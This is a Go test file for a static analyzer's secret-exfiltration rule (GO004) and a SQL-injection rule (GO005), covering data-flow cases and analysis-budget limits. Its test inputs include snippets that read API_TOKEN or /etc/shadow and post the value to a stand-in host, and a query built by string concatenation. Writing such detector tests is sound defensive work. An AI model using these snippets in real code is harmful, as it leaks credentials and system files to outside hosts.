package golang_test

import (
	"context"
	"errors"
	"fmt"
	"reflect"
	"strings"
	"testing"

	"github.com/skarm/scout/internal/analysis/analysisbudget"
	"github.com/skarm/scout/internal/analysis/document"
	"github.com/skarm/scout/internal/analysis/languages/golang"
	"github.com/skarm/scout/internal/capture/artifact"
)

func TestGoLocalFlow(t *testing.T) {
	prefix := `package p; import("os";"net/http";"strings";"bytes";"net/url"); func f(flag bool){`
	sink := `http.Post("https://example.invalid/collect","text/plain",strings.NewReader(token))`
	for _, tc := range []struct {
		name, body string
		want       int
	}{
		{name: "var-declaration", body: `var token = os.Getenv("API_TOKEN");` + sink, want: 1},
		{
			name: "multi-var-declaration",
			body: `var token, spare = os.Getenv("API_TOKEN"), "public"; _ = spare;` + sink,
			want: 1,
		},
		{
			name: "form-composite",
			body: `token:=os.Getenv("API_TOKEN");http.PostForm("x",url.Values{"key":{token}})`,
			want: 1,
		},
		{
			name: "arbitrary-composite",
			body: `token:=os.Getenv("API_TOKEN");body:=struct{value string}{token};http.Post("x","x",body)`,
			want: 0,
		},
		{
			name: "composite-mutation",
			body: `token:=os.Getenv("API_TOKEN");_=map[string]string{"key":mutate()};` + sink,
			want: 0,
		},
		{
			name: "struct-key-is-not-flow",
			body: `token:=os.Getenv("API_TOKEN");body:=struct{token string}{token:"public"};http.Post("x","x",body)`,
			want: 0,
		},
		{
			name: "elided-struct-key-is-not-flow",
			body: `token:=os.Getenv("API_TOKEN");body:=[]struct{token string}{{token:"public"}};http.Post("x","x",body)`,
			want: 0,
		},
		{
			name: "struct-key-preserves-state",
			body: `token:=os.Getenv("API_TOKEN");_=struct{token string}{token:"public"};` + sink,
			want: 1,
		},
		{
			name: "elided-struct-value-mutation",
			body: `token:=os.Getenv("API_TOKEN");mutate:=func() string {token="public";return "value"};_= []struct{token string}{{token:mutate()}};` + sink,
			want: 0,
		},
		{
			name: "composite-key-mutation",
			body: `token:=os.Getenv("API_TOKEN");mutate:=func() string { token="public"; return "key" };_=map[string]string{mutate():"value"};` + sink,
			want: 0,
		},
		{
			name: "form-key-flow",
			body: `token:=os.Getenv("API_TOKEN");http.PostForm("x",url.Values{token:{"value"}})`,
			want: 1,
		},
		{name: "index-mutation", body: `token:=os.Getenv("API_TOKEN");_=token[mutate()];` + sink, want: 0},
		{name: "slice-mutation", body: `token:=os.Getenv("API_TOKEN");_=token[0:mutate()];` + sink, want: 0},
		{name: "assertion-mutation", body: `token:=os.Getenv("API_TOKEN");_=mutate().(string);` + sink, want: 0},
		{name: "unary-mutation", body: `token:=os.Getenv("API_TOKEN");_=!mutate();` + sink, want: 0},
		{name: "deferred-mutation", body: `token:=os.Getenv("API_TOKEN");defer mutate();` + sink, want: 0},
		{name: "concurrent-mutation", body: `token:=os.Getenv("API_TOKEN");go mutate();` + sink, want: 0},
		{name: "both-return", body: `token:=os.Getenv("API_TOKEN");if flag{return}else{return};` + sink, want: 0},
		{name: "assignment", body: `token:=os.Getenv("API_TOKEN");` + sink, want: 1},
		{
			name: "reader-variable",
			body: `token:=os.Getenv("API_TOKEN"); body:=strings.NewReader(token); http.Post("x","x",body)`,
			want: 1,
		},
		{name: "overwrite", body: `token:=os.Getenv("API_TOKEN");token="public";` + sink, want: 0},
		{
			name: "multi-overwrite",
			body: `token:=os.Getenv("API_TOKEN");token,other:="public","text";_ = other;` + sink,
			want: 0,
		},
		{name: "lookup", body: `token,ok:=os.LookupEnv("API_TOKEN");_=ok;` + sink, want: 1},
		{
			name: "error-not-secret",
			body: `token,ok:=os.LookupEnv("API_TOKEN");_=token; http.Post("x","x",strings.NewReader(ok))`,
			want: 0,
		},
		{
			name: "file-read",
			body: `token,err:=os.ReadFile("/etc/shadow");_=err;http.Post("x","x",bytes.NewReader(token))`,
			want: 1,
		},
		{name: "ordinary", body: `token:=os.Getenv("LANG");` + sink, want: 0},
		{name: "branch-possible", body: `token:="public";if flag{token=os.Getenv("TOKEN")};` + sink, want: 1},
		{name: "both-overwrite", body: `token:=os.Getenv("TOKEN");if flag{token="a"}else{token="b"};` + sink, want: 0},
		{
			name: "guard",
			body: `token,err:=os.ReadFile("/etc/shadow");if err!=nil{return};http.Post("x","x",bytes.NewReader(token))`,
			want: 1,
		},
		{name: "terminated", body: `token:=os.Getenv("TOKEN");return;` + sink, want: 0},
		{name: "branch-terminated", body: `token:="public";if flag{token=os.Getenv("TOKEN");return};` + sink, want: 0},
		{name: "block-shadow", body: `token:="public";{token:=os.Getenv("TOKEN");_=token};` + sink, want: 0},
		{name: "block-outer-preserved", body: `token:=os.Getenv("TOKEN");{token:="public";_=token};` + sink, want: 1},
		{
			name: "malformed-source-call-barrier",
			body: `token:=os.Getenv("TOKEN");os.Getenv("name","extra");` + sink,
			want: 0,
		},
		{name: "malformed-file-source-barrier", body: `token:=os.Getenv("TOKEN");os.ReadFile();` + sink, want: 0},
		{name: "unknown-sanitizer", body: `token:=redact(os.Getenv("TOKEN"));` + sink, want: 0},
		{name: "unknown-mutator", body: `token:=os.Getenv("TOKEN");mutate(&token);` + sink, want: 0},
		{name: "hidden-mutator", body: `token:=os.Getenv("TOKEN");_=mutate().Field;` + sink, want: 0},
		{name: "loop-barrier", body: `token:=os.Getenv("TOKEN");for flag{token="public"};` + sink, want: 0},
		{name: "direct-not-duplicated", body: `http.Post("x","x",strings.NewReader(os.Getenv("TOKEN")))`, want: 0},
		{name: "url-flow", body: `token:=os.Getenv("TOKEN");http.Get("https://example.invalid/?t="+token)`, want: 1},
		{
			name: "unknown-object-method",
			body: `token:=os.Getenv("TOKEN");client.Post("x","x",strings.NewReader(token))`,
			want: 0,
		},
		{name: "concatenation", body: `token:=os.Getenv("TOKEN");token="Bearer "+token;` + sink, want: 1},
	} {
		t.Run(tc.name, func(t *testing.T) {
			text := prefix + tc.body + "}"
			r := goResult(t, "GO004", text, 20)
			if len(r.Matches) != tc.want || r.Truncated {
				t.Fatalf("want %d got %+v", tc.want, r)
			}
			for _, m := range r.Matches {
				if len(m.Trace) < 3 || len(m.Trace) > 8 || m.Trace[0].Role != "source" || m.Trace[len(m.Trace)-1].Role != "sink" {
					t.Fatal(m)
				}
				for _, s := range m.Trace {
					if s.Start < 0 || s.End > len(text) || s.Start >= s.End {
						t.Fatal(s)
					}
				}
			}
		})
	}
	shadow := `package p; import("os";"net/http";"strings");func f(os interface{Getenv(string)string}){token:=os.Getenv("TOKEN");` + sink + `}`
	if len(goResult(t, "GO004", shadow, 10).Matches) != 0 {
		t.Fatal("shadowed source")
	}
}

func TestGoFlowLimits(t *testing.T) {
	source := `package p;import("os";"net/http";"strings");func f(){token:=os.Getenv("TOKEN");`
	sink := `http.Post("x","x",strings.NewReader(token));`
	r := goResult(t, "GO004", source+sink+sink+"}", 1)
	if len(r.Matches) != 1 || !r.Truncated {
		t.Fatal(r)
	}
	r = goResult(t, "GO004", source+strings.Repeat(`token="prefix"+token;`, 20)+sink+"}", 10)
	if !r.Truncated {
		t.Fatal("trace work limit not surfaced")
	}
}

func TestGoScopeCopiesSpendOperationQuota(t *testing.T) {
	for _, ruleID := range []string{"GO004", "GO005"} {
		t.Run(ruleID, func(t *testing.T) {
			text := goScopeBudgetInput(ruleID)
			doc := document.Prepare(t.Context(), artifact.NewFile("input.go", []byte(text), false))
			for _, rule := range golang.Rules() {
				if rule.Rule().ID != ruleID {
					continue
				}
				limits := []uint64{128}
				if ruleID == "GO004" {
					// The larger quota admits both copies and stops at the merge.
					limits = append(limits, 192)
				}
				for _, limit := range limits {
					bounded := analysisbudget.WithLimit(t.Context(), limit)
					partial, err := rule.Find(bounded, doc, 10)
					if err != nil || !partial.Truncated || len(partial.Matches) != 1 || !analysisbudget.Exhausted(bounded) || analysisbudget.Used(bounded) > limit {
						t.Fatalf("scope quota lost or earlier evidence discarded: used=%d result=%+v err=%v", analysisbudget.Used(bounded), partial, err)
					}
				}
				cancelled, cancel := context.WithCancel(t.Context())
				cancel()
				if _, err := rule.Find(cancelled, doc, 10); !errors.Is(err, context.Canceled) {
					t.Fatal("cancellation ignored", err)
				}
				full := analysisbudget.WithLimit(t.Context(), 4096)
				complete, err := rule.Find(full, doc, 10)
				if err != nil || complete.Truncated || len(complete.Matches) != 2 {
					t.Fatalf("fresh quota failed to recover: %+v %v", complete, err)
				}
				used := analysisbudget.Used(full)
				for _, limit := range []uint64{used - 1, used} {
					ctx := analysisbudget.WithLimit(t.Context(), limit)
					result, err := rule.Find(ctx, doc, 10)
					limited := limit < used
					if err != nil || analysisbudget.Used(ctx) > limit || result.Truncated != limited || analysisbudget.Exhausted(ctx) != limited || len(result.Matches) == 0 {
						t.Fatalf("incorrect exact boundary: limit=%d used=%d result=%+v err=%v", limit, analysisbudget.Used(ctx), result, err)
					}
					if !limited && !reflect.DeepEqual(result, complete) {
						t.Fatal("exact quota changed completed observations")
					}
				}
				return
			}
			t.Fatal("rule not registered")
		})
	}
}

func goScopeBudgetInput(rule string) string {
	var setup strings.Builder
	if rule == "GO004" {
		setup.WriteString(`package p; import("os";"net/http";"strings");func f(flag bool){token0:=os.Getenv("TOKEN");`)
		for i := 1; i < 32; i++ {
			fmt.Fprintf(&setup, "token%d:=token0;", i)
		}
		const sink = `http.Post("x","x",strings.NewReader(token0));`
		return setup.String() + sink + `if flag{};` + sink + `}`
	}
	setup.WriteString(`package p;func f(name string){query:="SELECT "+name;`)
	for i := 1; i < 32; i++ {
		fmt.Fprintf(&setup, "local%d:=0;", i)
	}
	const sink = `db.Query(query);`
	return setup.String() + sink + `_=func(){};` + sink + `}`
}
